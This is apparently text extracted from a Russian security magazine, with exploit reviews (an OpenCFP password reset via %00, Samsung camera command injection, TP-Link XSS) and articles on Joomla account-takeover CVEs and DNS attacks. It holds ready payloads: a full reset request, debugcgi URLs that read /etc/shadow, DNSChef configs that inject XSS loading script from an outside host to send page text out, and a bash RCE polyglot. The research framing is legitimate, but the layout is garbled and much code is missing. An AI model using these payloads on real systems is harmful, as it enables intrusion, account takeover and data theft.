                                           Функция checkResetPasswordCode()

Эта функция вызывается из attemptResetPassword(). Заметь, что во время
смены пароля значение reset_password_code снова устанавливается NULL.





                                             Функция attemptResetPassword()


Сама ошибка довольно тривиальна. Она возникает из-за того, что значение
NULL может пройти проверку функцией checkResetPasswordCode() и вернет
true для любого пользователя, для которого в базе данных нет токена сброса.
Вызвать ошибку можно, отправив запрос с URL-символом NULL (%00) в каче-
стве значения параметра reset[reset_code].

POST /updatepassword HTTP/1.1
Host: domain
Referer:
http://domain/reset/2/vab9HtPIfIw2f6WLrzzidEbApaepDSGm9PkUKyKvZr
[...]
reset[_token]=x&reset[password][password]=passw0rd&reset[password]
   [password2]=passw0rd&reset[user_id]=2&reset[reset_code]=%00

В результате мы успешно изменим пароль пользователя с определенным
user_id на нужный нам.


                                                      Успешная смена пароля



Преградой станет только наличие неиспользованного токена сброса пароля
в базе данных. К тому же атакующему нужно, помимо email, знать цифровой ID
пользователя, чтобы иметь возможность зайти в систему. Но подобрать его
вряд ли будет сложно, учитывая, что первые несколько ID наверняка зачастую
принадлежат организаторам конференции.
   Оригинал отчета ты можешь найти в блоге автора эксплоита.

TARGETS
OpenCFP и другое ПО, использующее Sentry.

SOLUTION
Патч для фреймворка принят в основную ветку 5 сентября 2016 года.


МНОГОЧИСЛЕННЫЕ УЯЗВИМОСТИ
В IP-КАМЕРЕ SAMSUNG SNH-6410BN

 CVSSv2:      Нет
 Дата релиза: 11 августа 2016 года
 Автор:       Pen Test Partners
 CVE:         N/A

 Жертвой этого эксплоита стал очередной «умный» предмет — IP-камера
 Samsung SNH-6410BN. Сам девайс неплох, но с безопасностью у него про-
 блемы, что, кстати, характерно для всего класса устройств.
  Обычно пользователь соединяется с камерой с помощью мобильного при-
ложения или с сайта. При этом на самой камере работают SSH и веб-сервер.
С этого обычно и начинаются все исследования подобных устройств.

EXPLOIT
Сразу отметим, что веб-сервер работает только по HTTP, а не по HTTPS. В этом
и заключается первая проблема. Канал между устройством и пользователем
не шифруется, соответственно, данные могут быть просто перехвачены или даже
подделаны.
   Вторая проблема заключается в том, что используется только один веб-ак-
каунт. Если он будет скомпрометирован, то даст полный доступ к системе. По-
лучается, что вся безопасность завязана на один пароль.
   Этот пароль устанавливается при первом подключении. Однако о самом
существовании веб-интерфейса в документации к камере ничего не сообща-
ется, так что с большой вероятностью владелец устройства не будет к нему
подключаться и создавать учетку. Это и есть следующая, третья проблема.
  В середине 2014 года исследователь Zenofex из Exploitee.rs group обнару-
жил возможность сброса пароля на другой камере Samsung. Несмотря на то что
исследователи уведомили об этом производителя, новая камера подвержена
той же уязвимости. Проблемный код находится в файле /classes/admin_set_
privatekey.php. Он записывает новый ключ, не проверяя, был ли тот установ-
лен раньше. Это позволяет атакующему изменить ключ на любой другой.
   Вот кусок кода, который отвечает за первоначальную установку пароля.
Проверка выделена красным.





Получается, что пароль можно сбросить простым запросом к камере.





                                                          Пример запроса

Это позволяет нам получить доступ к веб-интерфейсу — первый шаг на пути
к root-шеллу.
   Вторая уязвимость, которую нашел Zenofex, — инъекция команд через поле
для ввода WEP-ключа в форме. Странно, но в отличие от уязвимости, позволя-
ющей сбросить пароль, эта уже не сработала. Значит, придется идти по ста-
рому пути — исследовать прошивку. Ее можно без проблем получить, скачав
с сайта Samsung Support файл .tgz.





                                                           Содержимое tgz

Как видишь, файл ничем не защищен и не зашифрован, что облегчает реверс
(если помнишь, в одном из предыдущих обзоров был эксплоит, автору кото-
рого пришлось соединяться с устройством по UART, чтобы подсмотреть алго-
ритм шифрования).
  Начнем исследование с файла ramdisk. Из расширения ясно, что это архив
gzip.





                                            Содержимое ramdisk из прошивки

Это файловая система ext2, а значит, ее с легкостью можно примонтировать
в любом дистрибутиве Linux.





                                                       Монтирование ramdisk


Содержимое похоже на корневую директорию. Посмотрим, доступен ли поль-
зователь root.





                                              Содержимое файла /etc/shadow

Для создания хеша пароля рута использован DES. Это значит, что его макси-
мальная длина составляет восемь символов и сбрутить его будет несложно.
   После того как у нас появился доступ к файловой системе, мы можем най-
ти и другие обработчики вводимых пользователем данных на веб-страницах.
Плохая проверка таких данных — это до сих пор самый популярный тип уязви-
мостей во встраиваемых системах.
   Скрипт на PHP, который принимает данные от сайта, передает их сразу не-
скольким cgi-бинарникам. Внимание автора привлек один из них с именем
debugcgi. Поиск текстовых строк показал, что в нем есть чистые системные
команды, которые используются в сочетании с синтаксисом форматирования
строки.





                                                        Строки из файла debugcgi


К сожалению, автору эксплоита не удалось найти PHP-скрипты, которые вызы-
вают этот исполняемый файл. Поэтому следующим шагом был анализ с помо-
щью IDA Pro.
  По найденным строкам уже понятно, что debugcgi вызывает какие-то си-
стемные команды. Поэтому начнем с вызовов system и exec и посмотрим,
к чему они приведут. В итоге нашлась интересная функция, которая содержит
строки с командами ls, netstat и ifconfig.





                                                          Граф вызовов файла
                                                                 debugcgi

Комбинируя эксперименты с debugcgi на устройстве, используя IDA и наблю-
дая за тем, как вызываются другие файлы CGI, автор смог понять, как органи-
зовать запуск команд. Параметр msubmenu может принимать следующие оп-
ции: data, setting и shell. Само собой, нам интересен shell!

http://<ip of camera>/cgi-bin/adv/debugcgi?msubmenu=shell&command=
   ls&command_arg=/

Используя эту опцию, мы можем вызывать серию команд из «белого списка»,
который включает в себя ls, netstat и другие. Вроде бы ничего опасного,
но лазейка все же нашлась.





                                                              Запуск опции shell
                                                              через debugcgi

Дело в том, что вслед за ls может идти аргумент — директория, содержимое
которой мы хотим посмотреть. Это значение подставляется внутрь строки, ис-
пользующей форматирование и snprintf:


Шелл позволяет запускать сразу несколько команд в одну строку. Воспользу-
емся этим:


Эта строка запустит команду ls для корневой директории, затем команды
whoami и uname. И если мы передадим их в аргументе command_arg, то получим
желаемый результат.





                                                Выполнение дополнительных
                                                 команд через аргументы к ls

Теперь у нас есть возможность выполнять команды с правами root! Хотя пока
что не любые. Попытавшись отправить команду, содержащую пробелы, мы по-
лучим ошибку. Даже если заменить их на %20, команда не будет выполнена.
  Но у bash есть другая интересная особенность — раскрытие скобок (brace
expansion). Оно позволяет обойти ограничение: строка {cat,/etc/shadow}
превращается в cat /etc/shadow.
   Теперь мы можем составить следующий запрос:

http://<ip of camera>/cgi-bin/adv/debugcgi?msubmenu=shell&command=
   ls&command_arg=/;{cat,/etc/shadow}





                                          Выполнение команды cat /etc/shadow
                                                  с помощью раскрытия скобок


Помимо всего этого, на устройстве по умолчанию уже запущен SSH на 1022-м
порту. Это открывает интересные пути дальнейшей эксплуатации.
   Изменение пароля пользователя на устройстве — один из таких путей.
Обычно для этого применяется команда passwd. Причем в большинстве де-
сктопных дистрибутивов для нее не требуется дополнительный ввод от поль-
зователя. Но на камере работает BusyBox, а в нем есть некоторые отличия.
В данном случае ввод от пользователя требуется, так что для инъекции команд
традиционный способ не подходит.
   Зато мы можем просто отредактировать файл /etc/shadow и заменить
хеш пароля. Правда, из-за ограничений это тоже потребует некоторых уси-
лий. Благо на устройстве есть sed. Используя его, мы можем найти старый хеш
(Y9IdQjgdLn0p6) и заменить на новый (к примеру, Um8sjRjZKSEI2 — это па-
роль 12345678).


Теперь мы можем подсоединиться к устройству по SSH с новым паролем
и управлять камерой из командной строки.
   Вот полный код эксплоита на Python для автоматизации атаки.





Оригинальный эксплоит опубликован в репозитории команды на GitHub, а ори-
гинальная статья — в блоге участников.

TARGETS
SNH-6410BN до августа 2016 года.

SOLUTION
Производитель выпустил исправление (автор пишет, что разработчики просто
убрали веб-интерфейс из новой версии прошивки).


XSS В TP-LINK ARCHER CR-700

 CVSSv2:      Нет
 Дата релиза: 27 сентября 2016 года
 Автор:       ayushman4
 CVE:          нет

 XSS-уязвимость в роутере TP-Link Archer CR-700 нашлась в довольно необыч-
 ном месте, но лишний раз напоминает, что все приходящие от пользователя
 данные надо проверять. Ошибка располагается в обработчике имени компью-
 тера пользователя (hostname), которое он отдает сетевому устройству. К при-
 меру, это происходит в момент получения IP-адреса при запросе DHCP.

EXPLOIT
Для воспроизведения бага можешь взять Kali или Ubuntu, но, в принципе, подой-
дет и любой другой дистрибутив.
  Первый шаг — в текстовом редакторе открываем файл /etc/dhcp/
dhclient.conf:


Комментируем строку


И вставляем свою:


Вторым шагом перезагружаем ОС, чтобы настройки точно применились.
  Шаг третий — отправляем запрос DHCP на роутер для получения IP-адре-
са (такую операцию можно попробовать на любой открытой сети с роутерами
этой марки).


Как ты уже понял, этот запрос устанавливает на роутере имя системы, которое
мы указали выше.
  Шаг четвертый — администратор авторизуется в системе, и в процессе
срабатывает наш скрипт. Автор эксплоита в дополнение заметил, что здесь
не используется токен CSRF, а cookie, которые устанавливает роутер, содер-
жат кодированные с помощью Base64 имя пользователя и пароль. Их можно
с легкостью получить при помощи такой XSS. Оригинальный отчет (md) автор
опубликовал на GitHub.

TARGETS
TP-Link Archer CR-700.

SOLUTION
Производитель выпустил исправление.
ВЗЛОМ
  В ДЕБРЯХ
 «ДЖУМЛЫ»





 СОЗДАЕМ ЛЕВЫЕ АККАУНТЫ И ПОВЫШАЕМ
        ПРИВИЛЕГИИ В JOOMLA





Сегодня мы разберем уязвимость в попу-
лярной CMS Joomla, которая прогремела на
просторах интернета в конце октября. Речь
пойдет об уязвимостях с кодами CVE-2016-            aLLy,@iamsecurityONSEC,
8869, CVE-2016-8870 и CVE-2016-9081. Все
три происходят из одного кусочка кода, который пять дол-
гих лет томился в недрах фреймворка в ожидании своего
часа, чтобы затем вырваться на свободу и принести с со-
бой хаос, взломанные сайты и слезы ни в чем не повинных
пользователей этой Joomla. Лишь самые доблестные и
смелые разработчики, чьи глаза красны от света монито-
ров, а клавиатуры завалены хлебными крошками, смогли
бросить вызов разбушевавшейся нечисти и возложить ее
голову на алтарь фиксов.

С ЧЕГО ВСЕ НАЧАЛОСЬ
6 октября 2016 года Дэмис Пальма (Demis Palma) создал топик на Stack
Exchange, в котором поинтересовался: а почему, собственно, в Joomla
версии  3.6 существуют два метода регистрации пользователей с оди-
наковым  названием  register()?  Первый  находится  в  контроллере
UsersControllerRegistration, а второй — в UsersControllerUser. Дэмис
хотел узнать, используется ли где-то метод UsersControllerUser::regist
er(), или это лишь эволюционный анахронизм, оставшийся от старой логики.
Его беспокоил тот факт, что, даже если этот метод не используется никаким
представлением, он может быть вызван при помощи сформированного запро-
са. На что получил ответ от девелопера под ником itoctopus, подтвердившего:
проблема действительно существует. И направил отчет разработчикам Joomla.
   Далее события развивались самым стремительным образом. 18 октября
разработчики Joomla принимают репорт Дэмиса, который к тому времени на-
бросал PoC, позволяющий регистрировать пользователя. Он опубликовал за-
метку на своем сайте, где в общих чертах рассказал о найденной проблеме
и мыслях по этому поводу. В этот же день выходит новая версия Joomla 3.6.3,
которая все еще содержит уязвимый код.
   После этого Давиде Тампеллини (Davide Tampellini) раскручивает баг до
состояния регистрации не простого пользователя, а администратора. И уже
21 октября команде безопасности Joomla прилетает новый кейс. В нем речь
уже идет о повышении привилегий. В этот же день на сайте Joomla появляет-
ся анонс о том, что во вторник, 25 октября, будет выпущена очередная версия
с порядковым номером 3.6.3, которая исправляет критическую уязвимость в
ядре системы.
   25 октября Joomla Security Strike Team находит последнюю проблему, кото-
рую создает обнаруженный Дэмисом кусок кода. Затем в главную ветку офи-
циального репозитория Joomla пушится коммит от 21 октября с неприметным
названием Prepare 3.6.4 Stable Release, который фиксит злосчастный баг.
   После этого камин-аута к междусобойчику разработчиков подключаются
многочисленные заинтересованные личности — начинают раскручивать уяз-
вимость и готовить сплоиты.
   27 октября исследователь Гарри Робертс (Harry Roberts) выкладывает в ре-
позиторий Xiphos Research готовый эксплоит, который может загружать PHP-
файл на сервер с уязвимой CMS.

ДЕТАЛИ
Что ж, с предысторией покончено, переходим к самому интересному — раз-
бору уязвимости. В качестве подопытной версии я установил Joomla 3.6.3, по-
этому все номера строк будут актуальны именно для этой версии. А все пути
до файлов, которые ты увидишь далее, будут указываться относительно корня
установленной CMS.
   Благодаря находке Дэмиса Пальмы мы знаем, что есть два метода, которые
выполняют регистрацию пользователя в системе. Первый используется CMS
и находится в файле /components/com_users/controllers/registration.
php:108. Второй (тот, что нам и нужно будет вызвать), обитает в /components/
com_users/controllers/user.php:293. Посмотрим на него поближе.





Здесь я оставил только интересные строки. Полную версию уязвимого метода
можно посмотреть в репозитории Joomla.
   Разберемся, что происходит при обычной регистрации пользователя: ка-
кие данные отправляются и как они обрабатываются. Если регистрация поль-
зователей включена в настройках, то форму можно найти по адресу http://
joomla.local/index.php/component/users/?view=registration.





                   Настройка, отвечающая за разрешение регистрации пользователей

)

Легитимный запрос на регистрацию пользователя выглядит как на следующем
скриншоте.





За работу с пользователями отвечает компонент com_users. Обрати внима-
ние на параметр task в запросе. Он имеет формат $controller.$method.
Посмотрим на структуру файлов.





                   Структура контроллеров компонента com_users
                                                                                                                 )

Имена скриптов в папке controllers соответствуют названиям вызываемых кон-
троллеров. Так как в нашем запросе сейчас $controller = "registration",
то вызовется файл registration.php и его метод register().
   Внимание, вопрос: как передать обработку регистрации в уязвимое место
в коде? Ты наверняка уже догадался. Имена уязвимого и настоящего методов
совпадают (register), поэтому нам достаточно поменять название вызывае-
мого контроллера. А где у нас находится уязвимый контроллер? Правильно, в
файле user.php. Получается $controller = "user". Собираем все вместе и
получаем task = user.register. Теперь запрос на регистрацию обрабаты-
вается нужным нам методом.





                             Попали в уязвимый метод класса UsersControllerUser

)
Второе, что нам нужно сделать, — это отправить данные в правильном форма-
те. Тут все просто. Легитимный register() ждет от нас массив под названием
jform, в котором мы передаем данные для регистрации — имя, логин, пароль,
почту (см. скриншот с запросом).
•  /components/com_users/controllers/registration.php:





Наш подопечный получает эти данные из массива с именем user.
•  /components/com_users/controllers/user.php:




Поэтому меняем в запросе имена всех параметров с jfrom на user.
Третий наш шаг — это нахождение валидного токена CSRF, так как без него
никакой регистрации не будет.
•  /components/com_users/controllers/user.php:




Он выглядит как хеш MD5, а взять его можно, например, из формы авториза-
ции на сайте /index.php/component/users/?view=login.





                                               CSRF-токен из формы авторизации

)
Теперь можно создавать пользователей через нужный метод. Если все полу-
чилось, то поздравляю — ты только что проэксплуатировал уязвимость CVE-
2016-8870 «отсутствующая проверка разрешений на регистрацию новых поль-
зователей».
   Вот как она выглядит в «рабочем» методе register() из контроллера
UsersControllerRegistration:
•  /components/com_users/controllers/registration.php:





А так в уязвимом:
•  /components/com_users/controllers/user.php:
   Ага, никак.
   Чтобы понять вторую, гораздо более серьезную проблему, отправим
сформированный нами запрос и проследим, как он выполняется на различных
участках кода. Вот кусок, который отвечает за проверку отправленных пользо-
вателем данных в рабочем методе:
•  /components/com_users/controllers/registration.php:





А вот как он выглядит в уязвимой версии метода:
•  /components/com_users/controllers/user.php:





Чувствуешь разницу? В первом случае в базу записываются валидированные
пользовательские данные, а во втором они только проверяются на валид-
ность. В базу же записываются сырые — те, что мы отправили в запросе. В
данном случае это очень важный момент, позже будет понятно почему.
  Метод validate модели Registration не просто выполняет базовые про-
верки (правильность указания email, наличие пользователя с таким же ником,
почтой и так далее), он еще отбрасывает те параметры, что не предусмотрены
моделью регистрации.
•  /libraries/legacy/model/form.php:




Посмотреть все правила можно в файле /components/com_users/models/
forms/registration.xml.
   Получается, что в случае «правильной» регистрации лишние данные от-
фильтруются функцией валидации и перезапишут переменную $data, а затем
попадут то в место, где создаются пользователи.
  В уязвимом методе эта логика нарушена. Результат фильтрации записыва-
ется в переменную $return, а в функцию register все так же попадает $data,
только на этот раз в ней находятся данные прямиком из запроса. Чтобы по-
нять, зачем нам, собственно, нужно было разбирать это поведение, перене-
семся в блок регистрации.
•  /components/com_users/models/registration.php:





В $temp обитают наши данные прямиком из запроса. Код на строке 386 гото-
вит данные для создания будущего пользователя. Нас интересует переменная
new_usertype.
•  /components/com_users/models/registration.php:





В new_usertype хранится ID группы, к которой будет относиться новоиспе-
ченный юзер. Этот код берется из настроек, и по умолчанию это Registered
(id=2). Только ведь существуют гораздо более интересные группы, зачем нам
томиться в этой? Результат выполнения getData — массив, в котором элемент
groups указывает на будущую принадлежность пользователя к определенной
группе.





                                                   Перезапись элемента groups


Дальше этот массив сливается с отправленными нами данными.
•  /components/com_users/models/registration.php:





Вот тут-то и притаилось главное зло, оно же CVE-2016-8869. Если в запросе,
помимо нужных для регистрации данных, мы отправим еще и groups, то де-
фолтное значение будет перезаписано и пользователь окажется привязан к
указанной нами группе.





                                                   Перезапись элемента groups


Теперь мы можем создавать админов (id=7). При добавлении этого поля об-
рати внимание на то, что элемент groups — это тоже массив, поэтому в запро-
се указываем именно user[group][].





               Созданный через уязвимость пользователь с правами администратора

)
К сожалению, нельзя так просто взять и создать суперадмина. При регистра-
ции выполняется проверка.
•  /libraries/joomla/user/user.php:





Следовательно, только суперадмины могут создавать пользователей, подоб-
ных себе.
  Но нам это и не нужно, ведь в рукаве припрятан еще один козырь — CVE-
2016-9081.
   Благодаря слаженной работе найденных багов и функций CMS мы можем
не только создавать новых пользователей, но и перезаписывать данные уже
существующих. Нам нужно узнать ID зарегистрированного суперадминистра-
тора и передать его в запросе как user[id]. Помимо этого, в user[groups][]
должна быть отправлена пустая строка. Это нужно для того, чтобы дефолтное
значение группы пользователя затерлось и не изменилось в базе. Если этого
не сделать, пользователь из группы суперадминов (id=8) уедет в группу заре-
гистрированных (id=2).





                                        Перезаписанные параметры класса User

)

После отправки данные попадут в метод bind, который превратит их в параме-
тры класса создаваемого пользователя.
•  /libraries/joomla/user/user.php:





•  /libraries/joomla/object/object.php:





Затем save запишет их в таблицу users.
•  /libraries/joomla/user/user.php:





Вуаля! Все данные, в том числе и пароль, теперь изменены на указанные нами
в запросе, а группа пользователя осталась та же.





                                    Оригинальные данные суперадминистратора





                                     Измененные данные суперадминистратора


Здесь я не буду расписывать, каким образом можно выполнить произвольный
код из аккаунта суперадминистратора. Задача эта тривиальная, да и тема ста-
тьи другая.
  На этом с уязвимостями предлагаю закончить. Но осталась еще одна смеж-
ная тема, которую я хотел бы осветить.

ОБХОД ОГРАНИЧЕНИЯ НА ЗАГРУЗКУ НЕУГОДНЫХ ФАЙЛОВ
Не могу не упомянуть о способе загрузки PHP-файлов, который был найден
ребятами из Xiphos Research.
   Исследуя описанные выше уязвимости, они столкнулись с такой пробле-
мой: Joomla отклоняет загруженные файлы, содержащие <?php и файлы c
опасными расширениями. Полный кусок кода, который проверяет файлы на
вшивость, можно посмотреть в /libraries/joomla/filter/input.php:584
или перейдя по этой ссылке на исходник. Выход нашелся благодаря знаниям
тонкостей настройки веб-серверов. Оказывается, помимо стандартных php4,
php5 и прочих .phtml, большая часть веб-серверов из коробки выполняет фай-
лы .pht.





Естественно, Joomla не считает это расширение опасным и разрешает его
загрузку и наличие шорт-тега <?= внутри файла. В своем эксплоите Xiphos ис-
пользуют именно такой способ доставки PHP-кода.

ЗАКЛЮЧЕНИЕ
Найденная уязвимость еще раз подтверждает, что иногда баги могут годами
лежать на самом видном месте и не быть обнаруженными.
ВЗЛОМ
ОПАСНЫЙОПАСНЫЙОПАСНЫЙОПАСНЫЙ
РЕЗОЛВРЕЗОЛВРЕЗОЛВРЕЗОЛВ





                                                                                   Антон «Bo0oM»
                                                                              Лопаницын
                                                                                               @i_bo0om,
                                                                                                   bo0om.ru




РАЗБИРАЕМ НА ПАЛЬЦАХ ТРИ
МОЩНЫХ ВЕКТОРА АТАК ЧЕРЕЗ DNS


DNS — одна из самых старых технологий в современных
реалиях интернетов. В эпоху появления доменных имен,
когда людям стало лень запоминать IP-адреса для вхо-
да на тот или иной компьютер, были созданы те самые
текстовые таблицы с алиасами IP-адресов. Спрашива-
ешь ты сервер DNS’а: кто такой domain.com? А он тебе
IP-адрес в ответ. Но когда интернет начал распростра-
няться по всему миру, доменов стало много и носить с со-
бой эту таблицу оказалось неудобно, появилась совре-
менная реализация DNS-серверов.

MAX POWER!
Современные DNS-серверы — распределенные. Они находятся в каждой точ-
ке мира и кешируют данные с различными типами записей. Эта запись для по-
чты, а эта — для SIP. A-запись вернет привычный всем IPv4-адрес, AAAA — IPv6.
Потом и DNSSEC подтянулся. В общем, обросла фичами та табличка, но сама
суть осталась неизменна. Отсюда и атаки с использованием DNS-сервера, ко-
торые актуальны до сих пор.
   Например, есть такой тип запроса — AXFR. Это запрос на передачу зоны
DNS. Он используется для репликации DNS-сервера, а если сервер настро-
ен неправильно, то он может вернуть все используемые записи конкретного
домена на этом сервере. Во-первых, этот missconfig позволяет узнать техни-
ческую информацию об инфраструктуре какого-либо сайта, какие тут IP-адре-
са и поддомены. Именно так украли исходники HL2 (может, поэтому так долго
нет третьей :D)? А так как в подавляющем большинстве случаев DNS работает
по протоколу UDP, подделать отправителя несложно.
  Этим и занялись вирмейкеры, запрашивая у тысячи серверов все данные
о каком-нибудь домене. В результате такого запроса в ответ отдается боль-
шой и толстый пакет, содержащий подробную информацию о конфигурации
сети, но пойдет он не к нам, а на указанный адрес. Результат налицо: разослав
большой список «уязвимых» доменов, использовав при этом малые ресурсы
сети и подделав обратный адрес, злоумышленник добьется того, что ответы
от тысяч DNS серверов просто забомбят подделанный IP-адрес.
  На смену им пришел DNSSEC — ключи, которые используются в нем, мно-
го больше, чем отправленные данные, в результате DDoS и отказ в обслужива-
нии ресурса, который стал жертвой «дудосеров», стало получить еще легче. Да
и вообще, DNS Amplification («DNS-усиление») имеет смысл, даже когда сер-
вер просто возвращает больше информации, чем ему отправляется, — напри-
мер, отправляются несколько десятков байт, а возвращается несколько сотен.

DNS REBINDING / ANTI DNS PINNING
Но и атаки на клиентов не в диковинку. Одна из атак позволяет злоумышленни-
ку обойти SOP и тем самым выполнить любое действие в контексте браузера
пользователя от его лица. Ну не совсем обойти, а использовать одну особен-
ность для атаки. Имя ее DNS Rebinding (она же Anti DNS Pinning). Смысл таков.
   Есть некий сайт, подконтрольный злоумышленнику. Домен имеет две A-за-
писи: первая — сам сайт хакера, вторая — внутренний ресурс, который недо-
ступен извне. Жертва открывает зловредный сайт, страница (с JavaScript) за-
гружается, после чего сервер, откуда загрузился сайт, перестает отвечать
на запросы.
   Что делает браузер, когда не отвечает IP из первой
записи? Правильно! Идет ко второй! При попытке об-
ращения к домену злоумышленника он идет на внутрен-
ний ресурс, тем самым силами JS он может отправлять
и принимать запросы, да и вообще творить черт-те что.
Почему? Потому что с точки зрения браузера страница
обращается на свой же домен. Вроде бы и жертва нахо-
                                               WARNING
дится на какой-то странице, в то же время эта страница
начинает брутить его роутер или почту и выносить оттуда      Кстати, вот подсказка
письма.                                                                охотникам за ошибками.
                                                                      Видишь, что IP отвечает   Правда, для этого необходимо выполнить ряд усло-                                                                           на произвольное до-
вий: уязвимый сервер должен отвечать на любой сторон-    менное имя, — расскажи
ний домен (ибо в заголовке Host будет доменное имя     разработчикам об этой
                                                                                      атаке :).злоумышленника,  по  понятным  причинам),   ну-у-у...
и знать, какой IP атаковать.
  На самом деле браузеры пытались исправить такого
рода атаки и ввели кеширование соответствия domain <->
IP на 60 секунд. Теперь злоумышленнику необходимо про-
держать жертву на странице больше минуты, но, думаю,
это не так сложно, ведь цель оправдывает средства.
  А узнать, какие внутренние ресурсы доступны, можно
                                                         INFOс помощью проверки хеша браузера или с помощью вари-
ации CSS History Hack. Последнюю использовали в иссле-                                                                              Почитать про DNS-
довании этой уязвимости PTsecurity (ссылки на материа-    ребиндинг можно тут:
лы, как всегда, в конце статьи). Но можно воспользоваться          https://crypto.
                                                                                     stanford.edu/dns/dns-и еще одной фичей.                                                                                             rebinding.pdf
   Как мы выяснили, если доменное имя имеет несколько
IP-адресов, то браузер (или другой клиент) при недоступ-          https://www.
                                                                                          ptsecurity.com/ности первой записи переходит на вторую.
                                                                            download/DNS-
  Тема такая. Специально настроенный сервер DNS воз-                                                                                             rebinding.pdf
вращает на доменное имя злоумышленника подобные
записи:

test.evil.host 192.168.1.1
test.evil.host 192.168.1.1.evil.host
test2.evil.host 192.168.1.2
test2.evil.host 192.168.1.2.evil.host
test3.evil.host 192.168.1.3
test3.evil.host 192.168.1.3.evil.host
test4.evil.host 192.168.1.3
test4.evil.host 192.168.1.3.evil.host
test5.evil.host 192.168.1.4
test5.evil.host 192.168.1.4.evil.host
test6.evil.host 192.168.1.5
test6.evil.host 192.168.1.5.evil.host
...

Теперь смотри. Когда жертва открывает страницу злоумышленника, на стра-
нице находится картинка, которая должна загрузиться с адреса test.evil.host,
браузер резолвит доменное имя и получает массив IP-адресов.
  Первым он пытается открыть 192.168.1.1:80, которого нет в нашей сети.
Недоступен? Идет дальше и открывает 192.168.1.1.evil.host. Так как это под-
контрольный сервер, мы фиксируем, что такого IP-адреса с таким портом нет.
   И-и-и... Делаем перенаправление на test2.evil.host! И так до тех пор, пока
ответа не будет или количество редиректов не достигнет 20 (обычно после
браузер перестает ходить по редиректам, хотя Хром выводит ошибку и про-
должает ходить).
  Создаем множество скрытых загрузок на различные порты и диапазоны
адресов — и мы получаем отсканированную внутреннюю сеть. Если порт от-
крыт, даже если это не HTTP, а, например, порт 3306 (MySQL), — браузер вы-
ведет ошибку и не будет больше переходить по редиректам. Посмотрев от-
сутствующие записи (браузер не отправил HTTP-пакет на этот адрес), можно
прикинуть, какие порты открыты.

XSS-ИНЖЕКТЫ ЧЕРЕЗ DNS
Некоторое время назад как иностранные, так и русскоязычные СМИ рассказы-
вали об атаке, в которой в качестве TXT-записи отдается XSS-вектор. Настра-
иваем TXT-запись подобным образом:

evil.host.  300 IN  TXT "<script>alert()</script>"

и там, где веб-приложение показывает эту запись, скрипт выполнится. Разу-
меется, если не фильтруются спецсимволы в пользовательских данных.
   «А что тут такого?» — подумал я. У меня XSS-вектор в домене висит полде-
сятка лет (еще Agava не может ее нормально пофиксить, алерт вылезает пря-
мо в кабинете), ведь завести подобную запись можно в любой панели управ-
ления. А как насчет других записей?
   Сказано — сделано. В первую очередь я запилил сервер и завел NS-запись
на hack.bo0om.ru, который будет обслуживаться моим сервером. Для упро-
щения создания конфигурации я воспользовался моим любимым Python-
скриптом DNSChef.
   Это DNS-proxy, который может логировать запросы к нему, а еще и удоб-
ненько настраивать.





                                                 Вот что отдавал мой DNS-сервер

Самое смешное, что в самом начале теста я завел запись

ns.hack.bo0om.ru.    0  IN   NS ns.hack.bo0om.ru.

(IP-адрес ns.hack нужно получить у домена ns.hack). И попробовал посовать
этот домен во всякие формы сайтов. Ну и что ты думаешь?
   Часть DNS-клиентов стала рекурсивно запрашивать у меня записи, а когда
лог достиг сотни мегабайт, эксперимент пришлось прервать. Технологии ис-
пользуются несколько десятков лет, а поломать все можно логической ловуш-
кой, ну офигеть теперь!
   Ну ладно, продолжим. Открываем dnschef.ini, пишем туда следующий
конфиг:

[NS]    # Queries for mail server records
*.xss.hack.bo0om.ru="-->'></script><script/src=//hi.bo0om.ru/
    js/?ns></script>
[MX]    # Queries for mail server records
*.xss.hack.bo0om.ru="-->'></script><script/src=//hi.bo0om.ru/
    js/?cname></script>
[CNAME] # Queries for alias records
*.xss.hack.bo0om.ru="-->'></script><script/src=//hi.bo0om.ru/
    js/?cname></script>

Звездочка возвращает ответ на любой запрос. В качестве имени параметра
я узнаю, какая запись спровоцировала загрузку JS-скрипта с моей стороны,
а на hi.bo0om.ru/js выдается скрипт, который делает нужное нам действие. Это
может быть классический alert(), но лично я брал текущую ссылку и собирал
весь текст страницы, где заинжектился скрипт, и отправлял себе.
   Вот тут-то и выяснилось, что большинство интернет-сервисов, которые по-
казывают информацию о записях DNS, вовсе не ожидают, что в качестве NS или
того же MX придет атакующий вектор. Фильтрует одно — проверяем другое.





                                                         Инжект на Who.is





                                                 Инжект на DNSqueries.com

Но профита от этого мало, правда? Ради эксперимента я решил попробовать
атаковать уже серверную часть. Какие есть пейлоады с выполнением произ-
вольного кода в bash? Я выделил

& whoami
`whoami`
$(whoami)
‘&whoami
“&whoami

Также на сервере может быть закрыт доступ на 80/443-й порт, а DNS обычно
открыт. Используя все эти трюки, я составил такой RCE-полиглот:

&$(ping${IFS}-c1${IFS}rce1.bo0om.ru)&ping -c1 rce2.bo0om.ru&'\"
    `0&$(ping${IFS}-c1${IFS}rce3.bo0om.ru)&ping -c1 rce4.bo0om.ru&`'

Команда ping выполнится на один из моих доменных имен, но, чтобы узнать,
какой IP у домена, он придет ко мне — тут-то я и увижу, что выполнение произ-
вольного кода сработало. Иду в конфиг, делаю так:

[NS]    # Queries for mail server records
*.rce.hack.bo0om.ru=&$(ping${IFS}-c1${IFS}rce1.bo0om.ru)&ping
    -c1 rce2.bo0om.ru&'\"`0&$(ping${IFS}-c1${IFS}rce3.bo0om.ru)&ping
    -c1 rce4.bo0om.ru&`'
[MX]    # Queries for mail server records
*.rce.hack.bo0om.ru=&$(ping${IFS}-c1${IFS}rce1.bo0om.ru)&ping
    -c1 rce2.bo0om.ru&'\"`0&$(ping${IFS}-c1${IFS}rce3.bo0om.ru)&ping
    -c1 rce4.bo0om.ru&`'
[CNAME] # Queries for alias records
*.rce.hack.bo0om.ru=&$(ping${IFS}-c1${IFS}rce1.bo0om.ru)&ping
    -c1 rce2.bo0om.ru&'\"`0&$(ping${IFS}-c1${IFS}rce3.bo0om.ru)&ping
    -c1 rce4.bo0om.ru&`'

Ну и что? А ничего. Посовал на всяких сайтах домен, а отстука о выполнении
произвольного кода нет. Не было. Где-то неделю. А потом та-да-ам!





                                                      Логи запросов с сервера


Действительно, кто-то собирал соответствие до-
мен — запись и недостаточным образом фильтро-
вал данные от DNS-сервера. Так может, таким об-                                 Примерыразом можно и Shodan хакнуть? :)
                                    уязвимых
OUTRO                                      серверов
Куда еще копать? DNS-туннели, DNS hijacking, OOB
attacks, DNS cache poisoning, DNS flood. Я уверен,                                                       robtex.com/
что можно таким образом выполнять SQL-инъек-
ции и их будет много больше, — правда, это полу-                                                            who.is/
